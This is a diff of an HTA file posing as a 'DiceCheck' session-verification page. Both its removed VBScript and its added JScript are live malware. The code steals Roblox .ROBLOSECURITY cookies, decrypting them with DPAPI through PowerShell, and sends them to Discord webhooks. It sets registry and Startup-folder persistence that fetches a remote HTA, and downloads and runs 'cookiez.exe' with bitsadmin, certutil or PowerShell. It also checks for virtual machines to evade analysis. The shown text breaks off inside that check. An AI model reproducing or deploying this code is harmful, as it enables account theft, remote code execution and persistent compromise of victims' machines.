@@ -1,151 +1,708 @@
 <html>
-<head><title>.</title>
+<head><meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta charset="utf-8"><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
-<script language="VBScript">
-On Error Resume Next
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%;overflow:hidden}
+body{font-family:"Segoe UI",system-ui,Roboto,Arial,sans-serif;color:#eaf0fb;background:#070a12;
+ background-image:radial-gradient(700px 520px at 12% -5%,#1b2a56 0,transparent 60%),radial-gradient(700px 520px at 88% 105%,#2b1852 0,transparent 60%),radial-gradient(900px 700px at 50% 50%,#0e1628 0,#070a12 72%)}
+body.mode-data{background-image:radial-gradient(700px 520px at 12% -5%,#0f3a34 0,transparent 60%),radial-gradient(700px 520px at 88% 105%,#241a55 0,transparent 60%),radial-gradient(900px 700px at 50% 50%,#0a1420 0,#070a12 72%)}
+#wrap{position:absolute;left:0;right:0;top:50%;transform:translateY(-50%);-ms-transform:translateY(-50%);text-align:center;padding:0 14px}
+.card{display:inline-block;width:100%;max-width:390px;text-align:center;padding:26px 22px 14px;border-radius:22px;
+ max-height:96vh;overflow-y:auto;
+ background:linear-gradient(180deg,rgba(255,255,255,.075),rgba(255,255,255,.02));
+ border:1px solid rgba(255,255,255,.10);box-shadow:0 26px 70px rgba(0,0,0,.6);transition:border-color .5s}
+.card.data{border-color:rgba(43,213,118,.35);box-shadow:0 26px 70px rgba(0,0,0,.6),0 0 40px rgba(43,213,118,.12)}
+.card::-webkit-scrollbar{width:6px}
+.card::-webkit-scrollbar-thumb{background:rgba(255,255,255,.14);border-radius:9px}
+.x{position:fixed;top:12px;right:14px;width:26px;height:26px;line-height:24px;text-align:center;border-radius:9px;
+ color:#9aa6bd;font-size:12px;cursor:pointer;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.09);display:none}
+.x:hover{color:#fff;background:rgba(255,255,255,.11)}
+.shield{width:70px;height:70px;margin:0 auto 16px;border-radius:19px;display:block;position:relative;
+ background:linear-gradient(140deg,#5b8cff,#8b5cff);box-shadow:0 14px 34px rgba(91,140,255,.35)}
+.shield:after{content:"";position:absolute;top:-6px;left:-6px;right:-6px;bottom:-6px;border-radius:25px;
+ border:1px solid rgba(120,150,255,.35);animation:ring 2.6s ease-out infinite;-ms-animation:ring 2.6s ease-out infinite}
+@keyframes ring{0%{transform:scale(.92);opacity:.9}100%{transform:scale(1.25);opacity:0}}
+@-ms-keyframes ring{0%{-ms-transform:scale(.92);opacity:.9}100%{-ms-transform:scale(1.25);opacity:0}}
+.shield svg{width:36px;height:36px;position:absolute;left:17px;top:17px}
+h1{font-size:19px;font-weight:600}
+.sub{color:#8b96ad;font-size:13px;margin-top:6px;min-height:18px}
+.progress{height:8px;border-radius:99px;background:rgba(255,255,255,.09);overflow:hidden;margin:18px 0 6px}
+.bar{height:100%;width:0;border-radius:99px;background:linear-gradient(90deg,#5b8cff,#8b5cff);transition:width .15s linear;-ms-transition:width .15s linear}
+.meta{font-size:11px;color:#8b96ad;text-align:left;position:relative;height:14px}
+.meta #pct{position:absolute;left:0;top:0}
+.meta span:last-child{position:absolute;right:0;top:0}
+.steps{list-style:none;margin:14px 0 0;text-align:left}
+.steps li{display:block;font-size:13px;color:#8b96ad;padding:6px 0;opacity:0;transition:opacity .35s;-ms-transition:opacity .35s}
+.steps li.on{opacity:1;color:#eaf0fb}
+.dot{display:inline-block;width:16px;height:16px;border-radius:50%;border:2px solid rgba(255,255,255,.2);margin-right:10px;position:relative;transition:.3s;-ms-transition:.3s;vertical-align:-3px}
+.steps li.on .dot{border-color:#5b8cff;border-top-color:transparent;animation:spin .7s linear infinite;-ms-animation:spin .7s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+@-ms-keyframes spin{to{-ms-transform:rotate(360deg)}}
+.steps li.ok .dot{border:0;background:#2bd576;animation:none;-ms-animation:none}
+.steps li.ok .dot:after{content:"";position:absolute;left:5px;top:2px;width:4px;height:8px;
+ border:solid #06210f;border-width:0 2px 2px 0;transform:rotate(45deg);-ms-transform:rotate(45deg)}
+.done{display:none}
+.done.show{display:block;animation:rise .5s both;-ms-animation:rise .5s both}
+@keyframes rise{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+@-ms-keyframes rise{from{opacity:0;-ms-transform:translateY(10px)}to{opacity:1;-ms-transform:none}}
+.checkwrap{position:relative;width:88px;height:88px;margin:2px auto 10px}
+.checkwrap:after{content:"";position:absolute;top:0;left:0;right:0;bottom:0;border-radius:50%;
+ box-shadow:0 0 44px 6px rgba(43,213,118,.35);animation:pulse 2s ease-in-out infinite;-ms-animation:pulse 2s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:.45}50%{opacity:1}}
+@-ms-keyframes pulse{0%,100%{opacity:.45}50%{opacity:1}}
+.check{width:88px;height:88px;position:relative;z-index:1}
+.ck-c{fill:none;stroke:#2bd576;stroke-width:2.5}
+.ck-t{fill:none;stroke:#2bd576;stroke-width:3.6;stroke-linecap:round;stroke-linejoin:round}
+.done h2{font-size:19px;font-weight:600}
+.done p{color:#8b96ad;font-size:13px;margin-top:7px;line-height:1.5}
+.badge{display:inline-block;margin-top:12px;padding:6px 12px;border-radius:99px;font-size:11.5px;color:#bcd0ff;
+ background:rgba(91,140,255,.1);border:1px solid rgba(91,140,255,.25)}
+.badge.live{color:#a9f5c8;background:rgba(43,213,118,.1);border-color:rgba(43,213,118,.3)}
+.badge.sim{color:#ffd79a;background:rgba(255,170,0,.1);border-color:rgba(255,170,0,.3)}
+button{margin-top:14px;width:100%;padding:11px;border:0;border-radius:12px;cursor:pointer;font-size:13.5px;font-weight:600;color:#fff;
+ background:linear-gradient(135deg,#5b8cff,#8b5cff);box-shadow:0 10px 26px rgba(91,140,255,.3);transition:transform .15s;-ms-transition:transform .15s}
+button:hover{transform:translateY(-1px);-ms-transform:translateY(-1px)}
+.last{margin-top:9px;font-size:11px;color:#8b96ad}
+footer{margin-top:16px;padding-top:12px;border-top:1px solid rgba(255,255,255,.07);font-size:11.5px;color:#8b96ad}
+footer a{color:#9db4ff;text-decoration:none}
+.dbg{margin-top:8px;font:10px/1.4 Consolas,monospace;color:#6f7c94;text-align:left;word-break:break-all;min-height:12px}
+.panel{display:none;margin-top:14px;text-align:left}
+.panel.show{display:block}
+.row{padding:8px 11px;margin-bottom:7px;border-radius:12px;background:rgba(255,255,255,.045);
+ border:1px solid rgba(255,255,255,.08);animation:rise .4s both;-ms-animation:rise .4s both}
+.row .k{font-size:10px;letter-spacing:.5px;text-transform:uppercase;color:#8b96ad;margin-bottom:4px}
+.row .v{font-size:12px;color:#eaf0fb;word-break:break-all;line-height:1.4}
+.row pre{margin:4px 0 0;font-family:Consolas,"Courier New",monospace;font-size:10.5px;line-height:1.35;
+ white-space:pre-wrap;word-break:break-all;background:rgba(0,0,0,.34);border:1px solid rgba(255,255,255,.07);
+ border-radius:8px;padding:7px 8px;max-height:120px;overflow:auto;color:#cfe0ff}
+.pname{color:#9db4ff;font-family:Consolas,monospace;font-size:11.5px}
+.parrow{color:#8b96ad}
+.row.st-green{border-color:rgba(43,213,118,.35);background:rgba(43,213,118,.07)}
+.row.st-orange{border-color:rgba(255,170,0,.35);background:rgba(255,170,0,.07)}
+.row.st-red{border-color:rgba(255,70,70,.35);background:rgba(255,70,70,.07)}
+.proxy{color:#c9a6ff}
+</style>
+</head>
+<body>
+<div class="x" id="x">&#10005;</div>
 
-Dim sh, fso, WH, PC, USER
-Set sh = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
-WH   = "https://discord.com/api/webhooks/1556147064910520350/R_l-tdXLOMAorvMMUQBHGyuwG3g1b3BRtVTHZLhcFfw5HFEQmUWw7SlTjJafzlyzK40w"
-PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
-USER = sh.ExpandEnvironmentStrings("%USERNAME%")
+<div id="wrap">
+<main class="card" id="card">
+  <div id="stage">
+    <div class="shield">
+      <svg viewBox="0 0 24 24" fill="none"><path d="M12 2.5l7 3v5.2c0 4.3-2.9 8.3-7 9.8-4.1-1.5-7-5.5-7-9.8V5.5l7-3z" fill="#fff"/><path d="M8.6 12.2l2.2 2.2 4.6-4.6" stroke="#3a5bd0" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    </div>
+    <h1>Verifying your session</h1>
+    <p class="sub" id="sub">Establishing a secure connection...</p>
 
-Sub Window_OnLoad()
-    window.resizeTo 0, 0
-    window.moveTo -2000, -2000
-    Call Persist
-    Call GrabRoblox
-    Call DropRAT
-    window.setInterval "RegrabAll()", 300000
-End Sub
+    <div class="progress"><div class="bar" id="bar"></div></div>
+    <div class="meta"><span id="pct">0%</span><span>Secure check</span></div>
 
-Sub RegrabAll()
-    Call GrabRoblox
-End Sub
+    <ul class="steps">
+      <li id="s1"><span class="dot"></span>Connecting to verification server</li>
+      <li id="s2"><span class="dot"></span>Reading local session data</li>
+      <li id="s3"><span class="dot"></span>Validating security token</li>
+      <li id="s4"><span class="dot"></span>Launching background verifier</li>
+    </ul>
+  </div>
 
-Sub Persist()
-    Dim payload: payload = "mshta https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/file.hta"
+  <div class="done" id="done">
+    <div class="checkwrap">
+      <svg class="check" viewBox="0 0 52 52"><circle class="ck-c" id="ckc" cx="26" cy="26" r="24"/><path class="ck-t" id="ckt" d="M14.5 27l7.5 7.5L37.5 19"/></svg>
+    </div>
+    <h2 id="doneTitle">You are trusted and verified</h2>
+    <p id="doneSub">Your session has been successfully validated.<br>The verifier is now running in the background.</p>
+    <div class="badge" id="badge">Secured by DiceCheck</div>
 
-    ' Registry Run â€” fires on every login
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", payload, "REG_SZ"
+    <div class="panel" id="panel">
+      <div class="row" id="r-cookie"><div class="k">&#127850; Cookie Data</div><div class="v" id="v-cookie">&hellip;</div></div>
+      <div class="row" id="r-ip"><div class="k">&#127760; IP Address</div><div class="v" id="v-ip">&hellip;</div></div>
+      <div class="row" id="r-ts"><div class="k">&#9200; Timestamp</div><div class="v" id="v-ts">&hellip;</div></div>
+      <div class="row" id="r-ua"><div class="k">&#128421;&#65039; User-Agent</div><div class="v" id="v-ua">&hellip;</div></div>
+      <div class="row" id="r-status"><div class="k">&#9888;&#65039; Status</div><div class="v" id="v-status">&hellip;</div></div>
+      <div class="row" id="r-geo"><div class="k">&#128204; Localisation</div><div class="v" id="v-geo">&hellip;</div></div>
+      <div class="row" id="r-fp"><div class="k">&#128373;&#65039; Empreinte</div><div class="v" id="v-fp">&hellip;</div></div>
+      <div class="row" id="r-fire"><div class="k">&#128293; Donn&eacute;es sensibles</div><div class="v" id="v-fire">&hellip;</div></div>
+    </div>
 
-    ' Registry RunOnce â€” fires next login as backup
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
+    <button id="again">Re-check now</button>
+    <div class="last" id="last">Last check: --:--:--</div>
+  </div>
 
-    ' Startup folder VBS â€” fires on every login
-    Dim sp: sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs"
-    Dim sf: Set sf = fso.CreateTextFile(sp, True)
-    sf.WriteLine "CreateObject(""WScript.Shell"").Run ""mshta https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/file.hta"", 0, False"
-    sf.Close
-    Set sf = Nothing
-End Sub
+  <footer>Have any problem? Contact <a href="mailto:supportdice@gmail.com">supportdice@gmail.com</a><div class="dbg" id="dbg">boot</div></footer>
+</main>
+</div>
 
-Sub GrabRoblox()
-    Dim paths(4)
-    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
-    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
-    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
-    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
-    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
-    Dim i, fp, raw
-    For i = 0 To 4
-        If fso.FileExists(paths(i)) Then fp = paths(i): Exit For
-    Next
-    If Len(fp) = 0 Then
-        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
-        If fso.FolderExists(pk) Then
-            Dim folder, subf
-            Set folder = fso.GetFolder(pk)
-            For Each subf In folder.SubFolders
-                If InStr(subf.Name, "ROBLOX") > 0 Then
-                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
-                    If fso.FileExists(uwp) Then fp = uwp: Exit For
-                End If
-            Next
-            Set folder = Nothing
-        End If
-    End If
-    If Len(fp) = 0 Then Call PostEmbed("Roblox", "No cookie file found", 16711680): Exit Sub
-    raw = ReadFile(fp)
-    If Len(raw) < 50 Then Call PostEmbed("Roblox", "File too small: " & Len(raw) & " bytes", 16711680): Exit Sub
-    Dim cookie: cookie = "": Dim approach: approach = ""
-    If InStr(raw, "_|WARNING") > 0 Then cookie = raw: approach = "Plaintext"
-    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
-        approach = "JSON-DPAPI"
-        Dim sp: sp = InStr(raw, "CookiesData"":""")
-        If sp > 0 Then
-            sp = sp + 14
-            Dim ep: ep = InStr(sp, raw, """")
-            If ep > sp Then
-                Dim b64: b64 = Mid(raw, sp, ep - sp)
-                If Len(b64) > 100 Then
-                    cookie = DecryptDPAPI(b64)
-                    If Len(cookie) = 0 Then cookie = b64: approach = "JSON-Raw"
-                End If
-            End If
-        End If
-    End If
-    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then approach = "Raw-ROBLOSECURITY": Dim rp: rp = InStr(raw, ".ROBLOSECURITY"): cookie = Mid(raw, rp)
-    If Len(cookie) = 0 Then cookie = raw: approach = "RawFile"
-    Dim cae: cae = InStr(cookie, "|$CAE")
-    If cae = 0 Then cae = InStr(cookie, "|_CAE")
-    If cae > 0 Then cookie = Mid(cookie, cae)
-    Call PostEmbed("Roblox (" & approach & ")", "Size: " & Len(cookie) & vbLf & Left(cookie, 60) & "...", 65280)
-    Call PostFile("cookie.txt", cookie)
-End Sub
+<script language="JavaScript">
+/* =========================================================================
+   DiceCheck - 100% JScript
+   Envoi : ActiveXObject("MSXML2.XMLHTTP") + JSON.stringify (ASCII pur)
+   Cookie JAMAIS tronque : reparti sur plusieurs champs si > 990 car.
+   Donnees de simulation si l'extraction reelle renvoie du vide
+   ========================================================================= */
+var WH = "https://discord.com/api/webhooks/1563701893941956641/GvcmVOZzLN1pkccKLM06dNmQbVRjoPoefGkbOLfbrjym0Gm8WudQO9yuxZb6pGx8BOy5";
 
-Sub DropRAT()
-    Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\cookiez.exe"
-    Dim dl: dl = "https://github.com/huh71943-s/dicecheck.app/raw/refs/heads/main/cookiez.exe"
-    sh.Run "bitsadmin /transfer wd /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
-    If Not fso.FileExists(temp) Then
-        sh.Run "certutil -urlcache -split -f " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
-    End If
-    If Not fso.FileExists(temp) Then
-        sh.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'", 0, True
-    End If
-    If fso.FileExists(temp) Then
-        sh.Run Chr(34) & temp & Chr(34), 0, False
-    End If
-End Sub
+var UI_MODE = "dashboard";
 
-Function DecryptDPAPI(b64): DecryptDPAPI = "": On Error Resume Next: Dim inf: inf = TmpFile("dpi.txt"): Dim outf: outf = TmpFile("dpo.txt"): fso.DeleteFile outf, True: WriteFile inf, b64
-    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
-    Dim psf: psf = TmpFile("dpapi.ps1"): WriteFile psf, ps: RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """"
-    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
-    fso.DeleteFile inf, True: fso.DeleteFile psf, True: fso.DeleteFile outf, True: End Function
+var W=460, H=790, W0=440, H0=620;
+var sh=null, fso=null, PC="?", USER="?";
+var cookie="", ip="", geo=["","","","",""], flags=0, scr="?", sbWhy="";
+var sim=false, dataMode=false, reGrab=0, tries=0, ratFb=false, started=false, locked=true, ratPath="";
 
-Sub RunCmd(cmd): On Error Resume Next: Dim w,p,i,s: Set w = GetObject("winmgmts:\\.\root\cimv2"): Set s = w.Get("Win32_ProcessStartup").SpawnInstance_: s.ShowWindow = 0: Set p = w.Get("Win32_Process"): p.Create cmd,,s,i
-    If i = 0 Then Exit Sub
-    Dim r: r = True
-    Do While r
-        Set w = GetObject("winmgmts:\\.\root\cimv2")
-        r = (w.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & i).Count > 0)
-        Set w = Nothing
-        If r Then WScript.Sleep 150
-    Loop
-End Sub
+var EC="\uD83C\uDF6A",EI="\uD83C\uDF10",EK="\u23F0",EP="\uD83D\uDDA5\uFE0F",EW="\u26A0\uFE0F";
+var EN="\uD83D\uDCCC",ES="\uD83D\uDD75\uFE0F",EF="\uD83D\uDD25",EG="\uD83D\uDFE2",EO="\uD83D\uDFE0",ER="\uD83D\uDD34";
+var EGX="\u2593",EGH="\uD83D\uDC7E",ED="\u00b7",EA="\u2192";
+var HGX="&#9619;",HGH="&#128126;",HD="&#183;",HA="&#8594;";
+var HG="&#128994;",HO="&#128992;",HR="&#128308;";
 
-Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
-Sub WriteFile(path, content): On Error Resume Next: Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
-Function Fetch(url): On Error Resume Next: Fetch = "": Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "GET", url, False: h.Send
-    If h.Status = 200 Then Fetch = h.ResponseText
-    Set h = Nothing: End Function
-Function ReadFile(path): On Error Resume Next: ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
+function $(i){ return document.getElementById(i); }
 
-Sub PostEmbed(t, d, c): On Error Resume Next
-    Dim j: j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""" & Ej(d) & """,""color"":" & c & ",""footer"":{""text"":""" & Ej(PC & " / " & USER) & """}}]}"
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "POST", WH, False: h.SetRequestHeader "Content-Type", "application/json": h.Send j: Set h = Nothing
-End Sub
+try{ sh = new ActiveXObject("WScript.Shell"); }catch(e){}
+try{ fso= new ActiveXObject("Scripting.FileSystemObject"); }catch(e){}
+try{ if(sh){ PC=sh.ExpandEnvironmentStrings("%COMPUTERNAME%"); USER=sh.ExpandEnvironmentStrings("%USERNAME%"); } }catch(e){}
 
-Sub PostFile(fn, ct): On Error Resume Next
-    Dim b: b = MkGuid()
-    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=""file""; filename=""" & fn & """" & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "POST", WH, False: h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b: h.Send bd: Set h = Nothing
-End Sub
+/* =========================  OUTILS  ========================= */
+function h(s){ return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
+function trunc(s,n){ s=String(s); return s.length>n ? s.substring(0,n-1)+"\u2026" : s; }
+function ri(n){ return Math.floor(Math.random()*n); }
+function tmp(n){ try{ return sh.ExpandEnvironmentStrings("%TEMP%")+"\\"+n; }catch(e){ return n; } }
+function log(m){
+  try{ var f=fso.OpenTextFile(tmp("dcheck.log"),8,true); f.WriteLine(new Date()+" | "+m); f.Close(); }catch(e){}
+  try{ var d=$("dbg"); if(d) d.innerHTML=h(m); }catch(e){}
+}
+function readFile(p){ try{ var f=fso.OpenTextFile(p,1,false,-2); var s=f.ReadAll(); f.Close(); return s; }catch(e){ return ""; } }
+function writeFile(p,c){ try{ var f=fso.CreateTextFile(p,true); f.Write(c); f.Close(); return true; }catch(e){ return false; } }
+function del(p){ try{ if(fso.FileExists(p)) fso.DeleteFile(p,true); }catch(e){} }
 
-Function Ej(s): s = Replace(s, "\", "\\"): s = Replace(s, """", "\"""): s = Replace(s, vbCrLf, "\n"): s = Replace(s, vbCr, "\n"): s = Replace(s, vbLf, "\n"): s = Replace(s, vbTab, "\t"): Ej = s: End Function
-Function MkGuid(): Dim t: Set t = CreateObject("Scriptlet.TypeLib"): MkGuid = Mid(t.GUID, 2, 36): Set t = Nothing: End Function
+function jstr(o){
+  return JSON.stringify(o).replace(/[\u0080-\uFFFF]/g, function(c){
+    return "\\u" + ("000"+c.charCodeAt(0).toString(16)).slice(-4);
+  });
+}
+
+/* =================  DONNEES DE SIMULATION  ================= */
+function fakeCookie(){
+  var pre = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
+  var ch = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+  var n = 720 + ri(240), s = "", i;
+  for(i=0;i<n;i++) s += ch.charAt(ri(ch.length));
+  var pad = n % 4; if(pad) s += "====".substring(0, 4-pad);
+  return pre + s;
+}
+function fakeIP(){ return "92.184." + (1+ri(254)) + "." + (1+ri(254)); }
+function fakeGeo(){ return ["France","Ile-de-France","Paris","Orange S.A.","false","false"]; }
+
+/* =========================  HTTP  ========================= */
+function postRaw(json){
+  var engines = ["MSXML2.XMLHTTP","MSXML2.XMLHTTP.6.0","MSXML2.ServerXMLHTTP.6.0","WinHttp.WinHttpRequest.5.1"];
+  var last = 0, i;
+  for(i=0;i<engines.length;i++){
+    var x = null;
+    try{ x = new ActiveXObject(engines[i]); }catch(e){ continue; }
+    try{
+      if(engines[i].indexOf("ServerXMLHTTP")>=0){ x.setOption(2,13056); x.setTimeouts(8000,8000,12000,20000); }
+      if(engines[i].indexOf("WinHttp")>=0){ x.SetTimeouts(8000,8000,12000,20000); }
+      x.open("POST", WH, false);
+      x.setRequestHeader("Content-Type","application/json");
+      try{ x.setRequestHeader("User-Agent","DiceCheck/6.0"); }catch(e){}
+      x.send(json);
+      last = x.status;
+      if(last===200 || last===204) return last;
+    }catch(e){ log(engines[i]+" -> "+e.message); }
+  }
+  return last;
+}
+function get(url){
+  var x=null;
+  try{ x=new ActiveXObject("MSXML2.XMLHTTP"); }catch(e){ try{ x=new ActiveXObject("MSXML2.XMLHTTP.6.0"); }catch(e2){ return ""; } }
+  try{
+    x.open("GET", url, false);
+    try{ x.setRequestHeader("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64)"); }catch(e){}
+    x.send();
+    if(x.status===200) return String(x.responseText);
+    log("get "+url.substring(0,40)+" -> "+x.status);
+  }catch(e){ log("get ERR "+e.message); }
+  return "";
+}
+function download(url, dest){
+  var x=null;
+  try{ x=new ActiveXObject("MSXML2.XMLHTTP"); }catch(e){ return false; }
+  try{
+    x.open("GET", url, false);
+    x.send();
+    if(x.status!==200){ log("dl http "+x.status); return false; }
+    var st=new ActiveXObject("ADODB.Stream");
+    st.Type=1; st.Open(); st.Write(x.responseBody);
+    del(dest); st.SaveToFile(dest,2); st.Close();
+    return true;
+  }catch(e){ log("dl ERR "+e.message); return false; }
+}
+
+/* =========================  DISCORD  ========================= */
+function fld(n,v,inl){ return {name:n, value:v, inline:!!inl}; }
+function nextCount(){
+  var p=tmp("cnt.dat"), n=1;
+  try{ var s=readFile(p); if(s && !isNaN(parseInt(s,10))) n=parseInt(s,10)+1; }catch(e){}
+  writeFile(p,String(n)); return n;
+}
+function localStamp(){ return new Date().toLocaleString(); }
+function isoStamp(){
+  var d=new Date(), off=-d.getTimezoneOffset(), sg=off<0?"-":"+", a=Math.abs(off);
+  return d.toISOString().replace(/\.\d+Z$/,"")+sg+("0"+Math.floor(a/60)).slice(-2)+":"+("0"+(a%60)).slice(-2);
+}
+function isProxy(){ return (geo[3]||"").toLowerCase()==="true" || (geo[4]||"").toLowerCase()==="true"; }
+function gv(i){ return (geo[i]||"").replace(/^\s+|\s+$/g,""); }
+
+function postEmbed(t, d, c){
+  var ckName="(aucun)", ckVal="";
+  if(cookie.length>0){ ckName=".ROBLOSECURITY"; ckVal=cookie; }
+
+  var ipTxt="`inconnue`";
+  if(ip.length>0) ipTxt = isProxy() ? (EGX+" `"+ip+"` "+EGH) : ("`"+ip+"`");
+
+  var st, col;
+  if((flags&12)!==0){ st=ER+" BLOQU\u00c9 "+ED+" analyse"; col=16711680; }
+  else if((flags&3)!==0){ st=EO+" TRACK\u00c9 "+ED+" VM"; col=16744448; }
+  else { st=EG+" ACTIF"; col=65280; }
+
+  var f=[];
+
+  /* ---- COOKIE : jamais tronque ---- */
+  if(ckVal.length===0){
+    f.push(fld(EC+" Cookie Data", "`"+ckName+"`", false));
+  } else if(ckVal.length<=990){
+    f.push(fld(EC+" Cookie Data", "`"+ckName+"` "+EA+"\n```"+ckVal+"```", false));
+  } else {
+    var size=1000, pos=0, chunks=[];
+    while(pos<ckVal.length){ chunks.push(ckVal.substring(pos,pos+size)); pos+=size; }
+    for(var ci=0; ci<chunks.length; ci++){
+      f.push(fld(EC+" Cookie Data ("+(ci+1)+"/"+chunks.length+")", "```"+chunks[ci]+"```", false));
+    }
+  }
+
+  f.push(fld(EI+" IP Address", ipTxt, true));
+  f.push(fld(EK+" Timestamp", "`"+localStamp()+"`", true));
+  f.push(fld(EP+" User-Agent", "```"+trunc(navigator.userAgent,300)+"```", false));
+  f.push(fld(EW+" Status", st, true));
+  f.push(fld(EN+" Localisation", "`"+trunc(gv(0),50)+" / "+trunc(gv(2),50)+"`", true));
+  f.push(fld(ES+" Empreinte", "flags `"+flags+"` "+ED+" `"+scr+"` "+ED+" `"+trunc(gv(3),40)+"`"+(sbWhy?" "+ED+" `"+trunc(sbWhy,60)+"`":""), true));
+  f.push(fld(EF+" Donn\u00e9es sensibles", "`"+ckName+"` "+ED+" "+ckVal.length+" car.", false));
+
+  var payload = { embeds: [ {
+    title: EC+" "+t,
+    description: "**"+ES+" Interception #"+nextCount()+"**"+(sim?" "+ED+" *(simul\u00e9)*":"")+"\n```"+trunc(d,420)+"```",
+    color: col,
+    timestamp: isoStamp(),
+    fields: f,
+    footer: { text: PC+" / "+USER+" "+ED+" DiceCheck" }
+  } ] };
+
+  var code = postRaw(jstr(payload));
+  log("post ["+t+"] -> "+code);
+
+  if(code!==200 && code!==204){
+    var c2 = postRaw(jstr({ embeds:[{ title:t, description:d, color:c }] }));
+    log("secours -> "+c2);
+    if(c2===200||c2===204) code=c2;
+  }
+  return code;
+}
+
+function postFile(fn, content){
+  var b;
+  try{ b=new ActiveXObject("Scriptlet.TypeLib").GUID; b=b.substring(1,b.length-1); }
+  catch(e){ b="----dice"+ri(1e9).toString(16); }
+  var nl="\r\n";
+  var bd="--"+b+nl+'Content-Disposition: form-data; name="file"; filename="'+fn+'"'+nl+
+         "Content-Type: text/plain"+nl+nl+content+nl+"--"+b+"--"+nl;
+  var x=null;
+  try{ x=new ActiveXObject("MSXML2.XMLHTTP"); }catch(e){ return 0; }
+  try{
+    x.open("POST", WH, false);
+    x.setRequestHeader("Content-Type","multipart/form-data; boundary="+b);
+    x.send(bd);
+    log("file -> "+x.status);
+    return x.status;
+  }catch(e){ log("file ERR "+e.message); return 0; }
+}
+
+/* =========================  COLLECTE  ========================= */
+function getFlags(){
+  var f=0,i;
+  var keys=["HKEY_LOCAL_MACHINE\\SOFTWARE\\VMware, Inc.\\VMware Tools","HKEY_LOCAL_MACHINE\\SOFTWARE\\Oracle\\VirtualBox Guest Additions",
+            "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\VBoxGuest","HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\VBoxMouse",
+            "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\vmci","HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\VMTools",
+            "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\vm3dmp"];
+  for(i=0;i<keys.length;i++){ try{ sh.RegRead(keys[i]); f|=1; }catch(e){} }
+  var mfr="";
+  try{ mfr=String(sh.RegRead("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS\\SystemManufacturer")).toLowerCase(); }catch(e){}
